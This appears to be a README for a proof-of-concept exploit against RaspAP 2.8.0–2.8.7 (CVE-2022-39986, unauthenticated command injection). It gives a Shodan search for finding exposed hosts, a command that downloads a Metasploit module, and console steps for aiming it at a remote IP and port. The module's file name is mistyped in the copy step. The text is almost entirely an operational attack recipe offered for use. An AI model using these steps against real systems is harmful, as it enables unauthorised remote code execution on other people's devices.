# 2022-39986
![](https://img.shields.io/static/v1?label=Product&message=RaspAP&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=2.8.0%20thru%202.8.7&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Unauthenticated%20Command%20Injection&color=red)

- Shodan dork:
```
"RaspAP"
```

### Install
```
wget https://github.com/getdrive/PoC/blob/main/2022/RaspAp_RCE/raspap_rce.rb
```
```
cp  raspap_rce.rd /usr/share/metasploit-framework/modules/exploit/unix/http/
```
### Usage
```
msfdb reinit; msfconsole -q
```
```
use exploit/unix/http/raspap_rce
```
```
set RHOST [IP]
set RPORT [PORT]
check
```
